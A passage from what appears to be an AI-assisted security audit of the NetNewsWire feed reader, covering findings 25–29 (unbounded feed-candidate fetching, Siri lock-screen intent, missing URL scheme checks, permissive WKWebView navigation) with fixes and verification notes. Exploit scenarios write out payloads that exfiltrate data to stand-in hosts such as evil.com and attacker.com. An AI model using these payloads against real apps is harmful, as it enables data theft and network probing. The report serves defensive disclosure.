- The `decidePolicyFor` delegate (lines 405–453) **only** intercepts `.linkActivated` navigation type. Non-linkActivated navigations (i.e., from injected `<meta http-equiv=refresh>` or `window.location =`) fall into the `else { decisionHandler(.allow) }` branch — the WKWebView navigates away freely
- An on-path attacker intercepting an `http://` feed can inject `<script>` tags that execute JavaScript, call `window.webkit.messageHandlers.*`, or redirect the WKWebView to a phishing page with no browser chrome

**NewsBlur cookie theft (overstated):**
- `URLRequest+NewsBlur.swift:38` does set `Cookie: newsblur_sessionid=…` on requests
- However, `NewsBlurAPICaller.swift:17` hardcodes `baseURL = URL(string: "https://www.newsblur.com/")!`
- Forcing a 301 redirect from `https://` to `http://` requires a TLS MITM position — if the attacker already has that, they have the cookie from the HTTPS session directly. ATS being disabled doesn't add capability here

**C. Defenses probed**

**WKWebView message handlers** are limited: `imageWasClicked`, `imageWasShown`, `showFeedInspector` — low impact if called by injected script. No privileged operations (file access, credential access) exposed.

**decidePolicyFor** does open http/https links in an external browser for user-activated taps, but this is bypassed by script-initiated navigation.

**No sanitization** of article body before rendering is confirmed by `ArticleRenderer.swift:117,222`.

**D. Verdict**

The feed-content-injection attack chain is real and reachable: adjacent-network attacker → intercept `http://` feed → inject HTML+JS → render in WKWebView → JavaScript executes, can redirect WKWebView to phishing page or extract WKWebView-scope data. The NewsBlur cookie-theft sub-claim requires a separate TLS-MITM capability and is materially overstated. The core finding is a TRUE_POSITIVE.

### 25. [MEDIUM] Unbounded concurrent HTTP requests from attacker-controlled HTML feed candidates
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/FeedFinder/Sources/FeedFinder/FeedFinder.swift:211-244`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
Data flow: (1) `FeedFinder.find(url:)` is called with an attacker-controlled URL via `AddWebFeedIntentHandler.handle`, `scene(_:openURLContexts:)`, or the Add-Feed UI. (2) `downloadAndLog(_:)` fetches the URL, which the attacker controls. (3) Because the response is HTML, `findFeedsInHTMLPage(htmlData:urlString:)` is called (FeedFinder.swift:91). (4) `possibleFeedsInHTMLPage` invokes `HTMLFeedFinder(parserData:)` (FeedFinder.swift:159), which parses every `<a>` link in the body (HTMLFeedFinder.swift:34–41) and, for each whose URL string contains 'feed', 'xml', 'rss', 'atom', or 'json' (case-insensitive), adds a `FeedSpecifier` to the candidate set — deduplicated only by URL string, not by count or host. (5) When no `<head>` feed links are present, all candidates are passed to `downloadFeedSpecifiers` (FeedFinder.swift:181). (6) `downloadFeedSpecifiers` (FeedFinder.swift:211–244) uses an unbound `withTaskGroup` — one concurrent `addTask` per specifier, with no cap — to fire simultaneous `Downloader.shared.download(url)` calls for every candidate. There is no limit on the total count of candidates, no scheme validation on the constructed `URL` (line 217 accepts any scheme including `file://` and internal HTTP), no concurrency ceiling, and no overall operation timeout imposed at this layer.

#### Impact
An attacker who controls a web page can cause the NetNewsWire app to issue hundreds or thousands of simultaneous HTTP requests to arbitrary hosts (including RFC-1918 addresses on the user's LAN) whenever a user attempts to add a feed. On iOS this can trigger OS-level process termination due to memory pressure; on both platforms it exposes the reachability of internal network hosts and exhausts device resources.

#### Exploit scenario
Attacker registers `attacker.com` and serves an HTML page containing 5,000 anchor tags whose `href` values are unique sub-domain URLs all containing 'rss' (e.g., `https://probe-192-168-1-N.attacker.com/rss`). A user clicks a link `netnewswire://add?url=https://attacker.com/` on a webpage (or is sent a Siri shortcut via `AddWebFeedIntentHandler`). The app downloads `attacker.com`, finds no `<link>` feed elements, falls through to the candidate path, and spawns 5,000 simultaneous `URLSessionTask` instances. The task storm exhausts the app's memory budget (each task allocates buffers), potentially crashes the app on iOS, and the DNS lookups or TCP SYN packets for attacker-controlled sub-domains reveal which RFC-1918 addresses in the user's LAN respond — information the attacker reads from their DNS/TCP logs.

#### Preconditions
- Attacker operates a web server that returns crafted HTML with many body links whose URLs contain any of the words 'feed', 'xml', 'rss', 'atom', or 'json'.
- User must initiate a feed-add action pointing to the attacker's URL — achievable via a custom URL scheme link (netnewswire://add?url=…) the user clicks in a browser, or via a Siri Shortcut delivered by an attacker.

```
// HTMLFeedFinder.swift:34-41 — collects unlimited candidates
let bodyLinks = HTMLLinkParser.htmlLinks(with: parserData)
for oneBodyLink in bodyLinks {
    if linkMightBeFeed(oneBodyLink), let normalizedURL = oneBodyLink.urlString?.normalizedURL {
        orderFound += 1
        let oneFeedSpecifier = FeedSpecifier(title: oneBodyLink.text, urlString: normalizedURL, source: .HTMLLink, orderFound: orderFound)
        addFeedSpecifier(oneFeedSpecifier)
    }
}

// FeedFinder.swift:215-235 — unbounded concurrent dispatch
await withTaskGroup(of: FeedSpecifier?.self) { group in
    for downloadFeedSpecifier in downloadFeedSpecifiers {
        guard let url = URL(string: downloadFeedSpecifier.urlString) else {
            continue
        }
        group.addTask {          // ← one task per candidate, no ceiling
            do {
                let downloadResponse = try await downloadAndLog(url)
                ...
            }
            return nil
        }
    }
}
```

#### How to fix
Enforce a hard cap on the number of candidate URLs collected before reaching `downloadFeedSpecifiers`. In `findFeedsInHTMLPage` (FeedFinder.swift:153–184), limit `feedSpecifiersToDownload` to a small constant (e.g., 20). Additionally, in `downloadFeedSpecifiers` (FeedFinder.swift:211), use a bounded task group (Swift Concurrency's `withThrowingTaskGroup` with an explicit concurrency limit, or a serial dispatch approach) rather than spawning one task per URL. Finally, validate that every candidate URL has an `http` or `https` scheme before scheduling the download (FeedFinder.swift:217) to prevent file:// and other scheme fetches.

**Exploitability:** FeedFinder fires unlimited concurrent Downloader requests to all candidate URLs extracted from attacker-controlled HTML page links matching feed-keyword substrings, with no concurrency cap, no scheme validation (file:// accepted), and no overall timeout. An attacker-controlled Add-Feed URL can direct requests to internal network hosts (SSRF) and exhaust connection resources. CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:C).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Unbounded `withTaskGroup` over attacker-controlled HTML link candidates is confirmed; `file://` SSRF is blocked by the scheme guard but HTTP-based LAN side-channel probing and DoS (app crash) via task-storm remain real, exploitable with one user-interaction click.

Now I have all the evidence I need. Let me compile my findings.

**Analysis Summary**

**A. Code verification (lines 211–244)**

The `downloadFeedSpecifiers` function (FeedFinder.swift:215) uses an uncapped `withTaskGroup` — one `group.addTask` per candidate URL from the HTML parser with no upper bound. `HTMLFeedFinder` collects every `<a>` body link whose URL string contains "feed", "xml", "rss", "atom", or "json", deduplicated only by exact URL string. Scanner's code description is accurate.

**B. External entry points**

`FeedFinder.find(url:)` is called from:
- `LocalAccountDelegate.createFeed` (line 197) — triggered by Add Feed UI and deep links
- `CloudKitAccountDelegate` (line 869) and `ReaderAPIAccountDelegate` (line 388)

The `AddWebFeedIntentHandler.handle()` entry point **does not** call `FeedFinder.find()` directly — it calls `ExtensionFeedAddRequestFile.save(request)` only, queuing for the main app. Still reachable indirectly once the app processes the queue, but the Siri path is one extra hop.

User interaction (clicking "add feed" with an attacker URL) is required, but achievable via `netnewswire://add?url=` deep link from a browser.

**C. Defences found**

**Critical partial mitigation — scheme guard in `Downloader.download` (line 70–74):**
```swift
guard url.isHTTPOrHTTPSURL() else {
    callback(DownloadResponse(data: nil, response: nil, ...), nil)
    return
}
```
`file://`, `javascript://`, and any non-HTTP scheme are silently dropped before any network call. This fully kills the `file://` SSRF variant described in the finding.

**Partial mitigation — per-host connection cap:**
```swift
sessionConfiguration.httpMaximumConnectionsPerHost = 1
```
Limits connections to 1 per hostname. However, an attacker using *N distinct hostnames* (e.g. `probe-1.attacker.com` … `probe-5000.attacker.com`) still causes *N* concurrent URLSessionTask objects and DNS lookups — one per unique host.

**D. Residual attack surface**

Two real attack vectors survive:

1. **Unbounded resource consumption (DoS):** Thousands of Swift `Task` + `URLSessionTask` allocations from a single page with crafted `<a>` links. URLSession will internally queue tasks beyond the pool limit but the allocations are still made up-front. On iOS, this can drive the app into memory-pressure termination.

2. **Internal network side-channel probing (limited SSRF):** An attacker serving `http://probe-192-168-1-N.attacker.com/rss` links can observe their own DNS/TCP logs to discover which of the attacker's subdomains were queried, thereby inferring the victim's LAN topology. The app discards HTTP response bodies, but the outbound DNS+TCP connection itself leaks information. The HTTP-only restriction keeps this constrained to port-agnostic HTTP probing rather than arbitrary scheme exploitation.

**What the scanner overstated:** `file://` and custom-scheme exploitation are fully blocked. The Siri shortcut path is indirect. The scheme guard is a real, working defence.

**What the scanner got right:** The `withTaskGroup` is genuinely unbounded (no `maxConcurrentTaskCount` or candidate-count ceiling), the HTML body link scanner has no cap, and HTTP-based LAN probing is viable.

---

### 26. [MEDIUM] AddWebFeedIntent accessible on locked device via Siri
**Class:** CWE-284: Improper Access Control
**CWE:** CWE-284: Improper Access Control - https://cwe.mitre.org/data/definitions/284.html
**File:** `iOS/IntentsExtension/Info.plist:33-34`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:A (non-network)*
**Confidence:** 0.82 (1 run agreed)

#### Description
The `IntentsRestrictedWhileLocked` key in Info.plist is present but set to an empty array (lines 33–34). Apple's Intents framework interprets an empty array as: no intents are restricted while the device is locked. The only declared intent, `AddWebFeedIntent`, is therefore available on the lock screen via Siri. The `AddWebFeedIntentHandler` (listed in the project's untrusted entry points) accepts a caller-supplied feed URL and writes it into the shared App Group container, causing NetNewsWire to subscribe to and fetch that URL on next refresh. There is no secondary auth challenge between the Siri trigger and the subscription write because `IntentsRestrictedWhileLocked` does not include `AddWebFeedIntent`.

#### Impact
Any person with physical or voice-proximity access to a locked iOS device with Hey Siri enabled can silently add arbitrary RSS feed URLs to the victim's NetNewsWire account. This causes the app to make outbound HTTP requests to attacker-controlled servers (disclosing the device's IP address and request metadata) and injects attacker-chosen content into the feed list. The action requires no PIN, biometric, or any other unlock gesture.

#### Exploit scenario
An attacker positions themselves near a victim's locked iPhone with Hey Siri enabled and says: 'Hey Siri, add web feed http://attacker.example/track.rss in NetNewsWire.' The Siri system dispatches `AddWebFeedIntent` to the extension without requiring an unlock. NetNewsWire subscribes and immediately or on next background refresh fetches `http://attacker.example/track.rss`, disclosing the victim's real IP to the attacker's server. The attacker can also supply a feed that returns crafted XML/HTML to influence what article content renders in the app.

#### Preconditions
- Attacker has physical proximity to the device (or voice range)
- Victim has 'Hey Siri' enabled on lock screen (iOS default for most devices)
- NetNewsWire is installed and the Intents Extension is active

```
<key>IntentsRestrictedWhileLocked</key>
<array/>
<key>IntentsRestrictedWhileProtectedDataUnavailable</key>
<array/>
```

#### How to fix
Add `AddWebFeedIntent` to the `IntentsRestrictedWhileLocked` array so the system blocks invocation until the device is unlocked. In Info.plist replace the empty `<array/>` at line 34 with `<array><string>AddWebFeedIntent</string></array>`. Also consider adding it to `IntentsRestrictedWhileProtectedDataUnavailable` (line 36) so the extension cannot run before first unlock after reboot.

**Exploitability:** AddWebFeedIntent is absent from IntentsRestrictedWhileLocked, making it available via Siri on the lock screen. Physical proximity to the device allows subscription to an attacker-specified feed URL without biometric re-authentication. CVSS 5.4 (AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L). Requires adjacent physical access only; no device unlock needed.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — The `IntentsRestrictedWhileLocked` empty array is confirmed in the actual plist; `AddWebFeedIntentHandler` performs no auth and writes caller-supplied URLs directly to App Group storage; the main app fetches those URLs unconditionally over HTTP. Physical proximity (Hey Siri) is the only precondition, reducing confidence slightly since iOS may layer an additional confirmation UI in practice, but the configuration flaw and code path are real.

Now I have all the evidence I need. Let me compile my findings.

**A. Verify the cited code (lines 33-34):**
The Info.plist is exactly as the scanner describes. `IntentsRestrictedWhileLocked` is present at lines 33-34 and set to an empty `<array/>`. The only declared intent is `AddWebFeedIntent` (line 39).

**B. Trace the call chain outward:**
- `IntentHandler.handler(for:)` routes any `AddWebFeedIntent` to `AddWebFeedIntentHandler()` — no auth check.
- `AddWebFeedIntentHandler.handle(intent:)` (line 93): reads `intent.url` (caller-supplied), resolves an account, then calls `ExtensionFeedAddRequestFile.save(request)` — writes to the shared App Group plist with no secondary auth.
- The main app's `ExtensionFeedAddRequestFile.process()` picks that request up and calls `account.createFeed(url: request.feedURL.absoluteString, ...)`, initiating a network fetch. Per the architecture notes, `NSAllowsArbitraryLoads: true` means plain HTTP URLs are accepted.

**C. Searching for defences:**
- `resolveUrl(for:)` only checks the URL is non-nil (`.success(with: url)`); no allowlist, no scheme restriction.
- No lock-screen auth challenge anywhere in the handler path.
- The empty `IntentsRestrictedWhileLocked` array is the developer's explicit opt-in to lock-screen availability; Apple's Intents framework will not force an unlock before dispatching the intent.
- Both `IntentsRestrictedWhileLocked` and `IntentsRestrictedWhileProtectedDataUnavailable` are empty, so even when protected data (Keychain, encrypted files) is unavailable the intent still dispatches.

**D. Probing the defence coverage:**
There is no defence. The URL flows from voice input → Siri → intent extension → App Group plist → main app feed fetch with zero validation at any step. The App Group storage boundary is the only crossing point, but it is write-only from the extension (no read-back validation in the main app before calling `createFeed`).

**Impact summary:** A physically-adjacent attacker who triggers "Hey Siri, add web feed `http://attacker.example/track.rss` in NetNewsWire" on a victim's locked device (Hey Siri is on by default) causes the device to subscribe and later HTTP-fetch the attacker URL, disclosing the device's real IP address. The feed content also renders in-app.

---

### 27. [MEDIUM] JSON Feed parser stores article and feed URLs without scheme validation
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Modules/RSParser/Sources/RSParser/Feeds/JSON/JSONFeedParser.swift:139-169`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.68 (1 run agreed)

#### Description
parseItem() (lines 139-170) extracts the 'url' (line 151) and 'external_url' (line 152) values from the untrusted JSON dictionary using bare as? String casts and forwards them without any URL scheme check to the ParsedItem constructor at line 169. At the feed level, parse() (lines 68-81) does the same for homePageURL (line 69), iconURL (line 73), and faviconURL (line 74). There is no isValidURLString equivalent anywhere in JSONFeedParser; any string value in those fields — including 'javascript:alert(document.cookie)', 'file:///etc/passwd', or 'data:text/html,<script>...' — is accepted and stored verbatim. AtomParser's resolvedURLString correctly rejects any URL whose resolved absoluteString does not begin with http:// or https://; JSONFeedParser applies no such filter.

#### Impact
An attacker-controlled JSON Feed can inject javascript:, file:, or data: scheme strings into article url, externalURL, and feed-level homePageURL, iconURL, and faviconURL fields. If any of those values are subsequently used as href attributes or navigation targets they could execute arbitrary JavaScript in the WKWebView context or expose local file contents.

#### Exploit scenario
Attacker serves {"version":"https://jsonfeed.org/version/1.1","title":"T","items":[{"id":"1","content_html":"body","url":"javascript:fetch('https://evil.com/?c='+document.cookie)"}]}. After the victim subscribes, the feed is fetched by LocalAccountRefresher and parsed; JSONFeedParser stores ParsedItem.url = 'javascript:fetch(...)'. If the article timeline or detail template places this URL in an <a href> inside the WKWebView without sanitization, one click exfiltrates session data or other webview-accessible content.

#### Preconditions
- Victim subscribes to an attacker-controlled JSON Feed
- The stored ParsedItem.url, ParsedItem.externalURL, or ParsedFeed.homePageURL is rendered as an href attribute or used for navigation without an additional scheme check

```
let url = itemDictionary[Key.url] as? String              // no scheme validation
let externalURL = itemDictionary[Key.externalURL] as? String   // no scheme validation
...
let homePageURL = d[Key.homePageURL] as? String            // no scheme validation
...
return ParsedItem(..., url: url, externalURL: externalURL, ...)
```

#### How to fix
Before assigning url, externalURL, homePageURL, iconURL, or faviconURL from parsed JSON, validate that the lowercased string begins with 'http://' or 'https://'. Introduce a shared URL-scheme validation utility (matching AtomParser's isValidURLString at lines 426-429) and apply it uniformly across RSSParser, AtomParser, and JSONFeedParser for all URL-bearing fields. Treat a non-conforming value as nil.

**Exploitability:** JSONFeedParser stores article URLs (url, external_url, homePageURL, iconURL, faviconURL) verbatim from untrusted JSON with no scheme check, persisting javascript:, file://, and data: URIs into the article database. Combined with findings 25 and 6, javascript: URIs reach WKWebView hrefs. CVSS ~4.9 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L). AtomParser is immune; JSONFeedParser is not.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — JSONFeedParser stores untrusted feed URLs without scheme validation; on iOS, the rendered `href` in `template.html` is directly clickable in WKWebView, whose `decidePolicyFor` handler returns `.allow` for `javascript:` and `data:` schemes, allowing injected script execution in the article-rendering WebView context by default. macOS is protected by its always-`.cancel` navigation policy.

Here is the complete verified attack chain and my verdict:

---

**Investigation Summary**

**A. The parser (confirmed)**
`JSONFeedParser.parseItem()` (lines 151–152) and the feed-level parse (lines 69–74) perform bare `as? String` casts with zero scheme validation. `AtomParser.isValidURLString()` explicitly filters to `http://` and `https://`; no equivalent exists in `JSONFeedParser`.

**B. Data flow to the WKWebView href (confirmed)**
1. `ParsedItem.url` → `Article.rawLink` (stored in DB)
2. `Article.link` = `URL.encodeSpacesIfNeeded(rawLink)?.absoluteString ?? rawLink` — `encodeSpacesIfNeeded` only replaces spaces; no scheme check.
3. `Article.preferredLink` = `link ?? externalLink` — no scheme check.
4. `ArticleRenderer.articleSubstitutions()` sets `d["preferred_link"] = article.preferredLink ?? ""`
5. `template.html` line 43: `<a href="[[preferred_link]]">[[title]]</a>` — verbatim substitution, no escaping or scheme guard.
6. Same path applies to `external_link` (line 45) and `feed_link` (line 36, from `homePageURL`).

**C. Defense audit (no effective guard found)**

| Defence | Present? | Covers `javascript:` / `data:` ? |
|---|---|---|
| AtomParser `isValidURLString` | ✓ (AtomParser only) | Irrelevant — JSONFeedParser has **no** equivalent |
| `URL.encodeSpacesIfNeeded` | ✓ | Only replaces spaces; `URL(string: "javascript:alert(1)")` succeeds and returns a URL with scheme `javascript` |
| `Article.baseURL` scheme guard | ✓ (returns nil for non-http/https) | Guards only the WKWebView `baseURL`, not the `href` content |
| iOS `decidePolicyFor` scheme check | ✓ for http/https/mailto/tel | Falls through to `decisionHandler(.allow)` for **any other scheme**, including `javascript:` and `data:` |
| macOS `decidePolicyFor` | Cancels all `linkActivated` | WKWebView navigation cancelled; `javascript:` passed to `NSWorkspace.open` which fails silently — **macOS WebView is protected** |
| `allowsContentJavaScript` | ✓ user toggle | Defaults to **`true`** (iOS AppDefaults line 401, macOS line 347) |
| Content Security Policy | None found in template | No `<meta http-equiv="Content-Security-Policy">` in `template.html` |

**D. Exploit path on iOS (confirmed exploitable)**
Feed JSON → `JSONFeedParser` stores `url = "javascript:fetch('https://evil.com/?c='+btoa(document.body.innerHTML))"` → rendered as `href` in article title/date anchors → user clicks title → `decidePolicyFor` returns `.allow` (unknown scheme branch) → with default `allowsContentJavaScript = true` the WKWebView executes the JavaScript in the article rendering context.

**Same chain applies to `data:text/html,<phishing form>` for UI-redress attacks.**

**macOS is substantially mitigated** because `decidePolicyFor` always calls `.cancel` on `linkActivated`, preventing in-WebView execution. The `javascript:` URL is passed to `NSWorkspace.open`, which fails benignly.

**Impact scoping:** The WKWebView is loaded with the app-bundle `file://` base URL; `document.cookie` is empty for that origin. The JavaScript can manipulate the DOM (deface the article view), exfiltrate the rendered article HTML body to an external server, navigate the WebView to arbitrary `data:` content (phishing), and invoke the three registered native message handlers (`imageWasClicked`, `imageWasShown`, `showFeedInspector`). It cannot directly reach the Keychain or native account credentials.

---

### 28. [MEDIUM] RSSParser stores non-HTTP scheme URLs in article and feed links
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Modules/RSParser/Sources/RSParser/Feeds/XML/RSSParser.swift:238-348`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
handleArticleElementEnd (lines 238-243) passes the raw text content of an item's <link> element directly to resolveURL() with no scheme check. resolveURL() (lines 336-348) only fast-returns for strings that begin with 'http'; for every other string it either (a) returns the raw input unchanged when homepageURLString is absent (line 341, the else-branch of the guard), or (b) resolves the URL against the base and returns resolved.absoluteString without validating the output scheme (line 347). Swift's URL(string:relativeTo:) preserves the scheme of an absolute reference, so 'javascript:alert(1)' is returned unmodified via both paths. The same gap exists in handleGuid (lines 264-266): when a guid passes stringIsProbablyURLOrRelativePath (any slash-containing, non-tag: string), resolveURL is called without a scheme guard. The channel-level <link> is stored directly in homepageURLString in handleFeedElementEnd (lines 290-293) with no validation at all. By contrast, AtomParser.resolvedURLString (lines 404-428) validates both the input and the resolved output via isValidURLString (which requires http:// or https://), making AtomParser immune to this class of injection.

#### Impact
A malicious RSS feed can inject javascript: or file: scheme strings as article link, permalink, or feed homepage URL. If the application renders these values as href attributes inside the article WKWebView or passes them to NSWorkspace/UIApplication for navigation, arbitrary JavaScript executes in the webview context or local file paths become accessible to the caller.

#### Exploit scenario
An attacker hosts https://evil.com/rss.xml returning <item><title>Click me</title><link>javascript:fetch('https://evil.com/?c='+encodeURIComponent(document.cookie))</link></item>. The victim subscribes; LocalAccountRefresher fetches and RSSParser parses the feed. resolveURL('javascript:fetch(...)') sees no homepageURLString, hits the guard's else branch at line 341, and returns the javascript: string unchanged. article.link is stored as 'javascript:fetch(...)'. If the article-detail HTML template renders this as an <a href> inside the WKWebView, one click exfiltrates whatever data is accessible in that webview context.

#### Preconditions
- Victim subscribes to an attacker-controlled RSS feed
- The stored article.link, article.permalink, or homepageURLString is placed in an href attribute inside the WKWebView or passed to a platform navigation API without an additional scheme check

```
} else if localName.equals("link") {
    if article.link == nil {
        if let s = parser.currentStringWithTrimmedWhitespace, !s.isEmpty {
            article.link = resolveURL(s)   // no output scheme validation
        }
    }
}
...
private func resolveURL(_ s: String) -> String {
    if s.lowercased().hasPrefix("http") { return s } // broad; allows "httpXXX://"
    guard let baseString = homepageURLString, !baseString.isEmpty,
          let baseURL = URL(string: baseString) else {
        return s   // returns raw javascript:/file: input unchanged
    }
    guard let resolved = URL(string: s, relativeTo: baseURL) else { return s }
    return resolved.absoluteString  // scheme never re-validated after resolution
}
```

#### How to fix
Introduce an isValidURLString helper identical to AtomParser lines 426-429 (http:// or https:// only). Apply it in resolveURL before both early-return paths: reject (return nil or the empty string) any input whose lowercased form does not start with 'http://' or 'https://', and validate again after line 346 before returning resolved.absoluteString. Additionally validate homepageURLString before storing it (line 292) and channelImageURLString before storing it (line 169). A shared utility in RSParser should replace the current duplicate logic.

**Exploitability:** RSSParser stores javascript:, file://, and data: URIs in article and feed link fields without scheme validation. AtomParser is immune (isValidURLString guard). Combined with findings 25 and 6 this enables javascript: link injection via RSS. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — RSSParser lacks AtomParser's scheme guard; `javascript:` URLs flow unchanged through to href attributes; iOS navigation delegate returns `.allow` for unknown schemes; JavaScript is enabled by default; WKWebView will execute the payload on user click. macOS is not exploitable via this path. Impact is confined to the isolated null-origin WKWebView context.

Now I have all the evidence I need. Let me synthesize my findings.

**Summary of investigation:**

**A. The Parser (confirmed flaw):**
- `RSSParser.resolveURL()` (line 337): Only checks `hasPrefix("http")` — returns raw `javascript:` string unchanged when no base URL is present, or resolves it without scheme re-validation.
- `handleFeedElementEnd` (line 290): Stores `<link>` channel content into `homepageURLString` with zero validation.
- `handleGuid` (line 265): `stringIsProbablyURLOrRelativePath` allows any `/`-containing string (including `javascript:/`) → calls `resolveURL` with no guard.
- Contrast: `AtomParser.resolvedURLString()` (line 404–428) calls `isValidURLString()` on both input and output, requiring `http://` or `https://`.

**B. Data path to rendering (confirmed):**
- `Article.link` → `ArticleUtilities.url` → `URL.encodeSpacesIfNeeded()` — `URL(string: "javascript:alert(1)")` succeeds (parens and alphanumerics are valid path chars in RFC 3986), returning the URL unchanged.
- `article.preferredLink` returns the stored `javascript:` URL without any scheme check.
- `ArticleRenderer.articleSubstitutions()` sets `d["preferred_link"] = article.preferredLink ?? ""` — no sanitisation.
- `MacroProcessor.processMacros()` does **raw string replacement** — no HTML encoding.
- `template.html` lines 43–44: `<a href="[[preferred_link]]">` — `javascript:alert(1)` lands verbatim in an href attribute.
- `Article.baseURL` scheme-checks for http/https and returns nil for `javascript:`, so `webView.loadHTMLString(html, baseURL: nil)` is called — the page origin is `null`.

**C. Defences assessed (iOS — the live path):**
- `WebViewConfiguration` confirms `preferences.allowsContentJavaScript = AppDefaults.shared.isArticleContentJavascriptEnabled`, and the iOS/Mac `AppDefaults` default-dictionary entry at line 401/347 is **`true`** — JavaScript is on by default.
- iOS `decidePolicyFor` (line 448): the `else { decisionHandler(.allow) }` branch is the final fallthrough for any scheme that isn't `http`, `https`, `mailto`, or `tel`. `javascript:` is not handled → **`.allow` is returned**.
- When `allowsContentJavaScript = true` and the navigation policy is `.allow`, WKWebView will evaluate a `javascript:` URL navigation activated by user click.

**D. macOS path (largely mitigated):**
- Mac `decidePolicyFor` (line 206): **all** link activations call `decisionHandler(.cancel)` and pass the URL to `Browser.open()` / `NSWorkspace`. `NSWorkspace.shared.open(javascript:…)` silently fails (no system handler registered). macOS is not a working exploit path for JavaScript execution.

**E. Practical impact on iOS:**
The executed JavaScript runs in a `null`-origin WKWebView. No app cookies, no localStorage. Can read the article DOM (attacker-controlled) and invoke registered WKScriptMessageHandlers (`imageWasClicked`, `imageWasShown`, `showFeedInspector`). The call bridge itself causes limited app side-effects. However, JavaScript execution in the app's WKWebView via an attacker-crafted `javascript:` href in a feed item's `<link>` is a confirmed, application-level XSS with real (if limited) impact.

---

### 29. [MEDIUM] iOS WKWebView allows link-activated navigations to file://, data:, and custom scheme URIs
**Class:** CWE-183
**CWE:** CWE-183 - https://cwe.mitre.org/data/definitions/183.html
**File:** `iOS/Article/WebViewController.swift:405-454`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The iOS `decidePolicyFor` correctly handles `http`, `https`, `mailto`, and `tel` schemes for link-activated navigations, but the final `else { decisionHandler(.allow) }` at line 449 passes all other schemes back to WebKit unblocked. This includes:
- `file://`: WebKit attempts file navigation; iOS sandbox limits access but allows reads within the container.
- `data:text/html,<script>…</script>`: If article content JavaScript is enabled, the data page executes JS in the same WKWebView context and can invoke all registered message handlers (`imageWasClicked`, `imageWasShown`, `showFeedInspector`).
- Custom deep-link schemes: WebKit passes them to the iOS URL dispatch system, potentially opening third-party apps without explicit user intent.
The non-link-activated branch (`else { decisionHandler(.allow) }` at line 452) has the same issue for renderer-initiated navigations on iOS.

#### Impact
A malicious feed article can include hyperlinks with `data:`, `file://`, `javascript:`, or custom deep-link scheme URLs. When a user taps such a link, the navigation policy handler returns `.allow`, causing the WKWebView to attempt loading the URI. For `data:text/html` URIs the resulting page executes inside the same WebView process with access to all registered WKUserContentController message handlers, including `imageWasClicked`, which triggers an out-of-band download to any attacker-supplied URL.

#### Exploit scenario
Attacker's feed article contains: `<a href="data:text/html,<script>window.webkit.messageHandlers.imageWasClicked.postMessage(JSON.stringify({x:0,y:0,width:100,height:100,imageURL:'https://attacker.com/beacon?u=victim',imageTitle:null}))</script>">Tap for full story…</a>`. User (with article content JS enabled) taps the link. The data: URI loads in the WKWebView; its script invokes `imageWasClicked`, which triggers `Downloader.shared.download('https://attacker.com/beacon?u=victim')`. The app issues an authenticated HTTP request to the attacker's server, revealing the user's IP address and bypassing ContentRules.json blocklist enforcement.

#### Preconditions
- Victim subscribes to an attacker-controlled feed
- Victim taps the deceptive link in the article
- Article content JavaScript must be enabled for the data: URI JS execution path; the file:// path requires no JS

```
} else {
    decisionHandler(.allow)  // line 449: file://, data:, javascript:, custom schemes pass through
}
} else {
    decisionHandler(.allow)  // line 452: all non-link-activated navigations pass through
}
```

#### How to fix
Add an explicit `decisionHandler(.cancel)` for all unrecognised schemes in the `linkActivated` branch (lines 448-450), and for the non-linkActivated branch add a scheme allowlist before calling `decisionHandler(.allow)`. Specifically, replace the final `else { decisionHandler(.allow) }` blocks with scheme guards that only allow `http` and `https` (and the app's own custom scheme `nnwImageIcon`). This mirrors the correct handling already present for http/https at line 414.

**Exploitability:** iOS WKWebView decidePolicyFor has a catch-all else{decisionHandler(.allow)} that passes file://, data:, and custom-scheme navigations to WebKit unblocked. A data: URI with embedded JavaScript executes in the same WKWebView context as registered message handlers. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L). Third step in the javascript:-href execution chain (findings 44/45 → 25 → 6).

#### Adversarial verification
